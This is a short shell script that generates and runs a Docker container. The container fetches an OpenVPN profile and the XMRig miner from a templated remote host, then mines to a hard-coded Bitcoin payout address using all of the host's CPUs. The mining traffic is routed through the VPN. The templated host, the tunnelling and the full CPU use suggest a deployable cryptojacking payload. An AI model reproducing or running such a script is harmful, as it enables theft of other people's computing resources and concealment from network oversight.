#!/bin/sh
name="$(date +"%d_%I_%M_%S")"
cpu="$(grep -c ^processor /proc/cpuinfo)"
name_cnt="coin"
echo "
FROM ubuntu
WORKDIR /root
RUN apt-get update
RUN apt-get install -y net-tools wget openvpn dnsmasq nano
RUN cd ~
RUN wget !!__URL__!!resource/rdp.ovpn
RUN wget !!__URL__!!resource/xmrig-6.15.1-linux-x64.tar.gz
RUN tar -xf xmrig-6.15.1-linux-x64.tar.gz
RUN echo \"nameserver 8.8.8.8\" > /etc/resolv.conf
RUN echo \"\\
service dnsmasq start &&\\
openvpn --config rdp.ovpn --daemon &&\\
cd xmrig-6.15.1 &&\\
./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1qxt9n2qq8yy2n462atcqejuu63cfdm07aztx5d3.$name -p x\n\\
\"> de.sh
CMD [\"sh\", \"de.sh\"]
" > Dockerfile
docker build --tag=$name_cnt .
docker run -it -d --cap-add=NET_ADMIN --device /dev/net/tun --cpus="$cpu" $name_cnt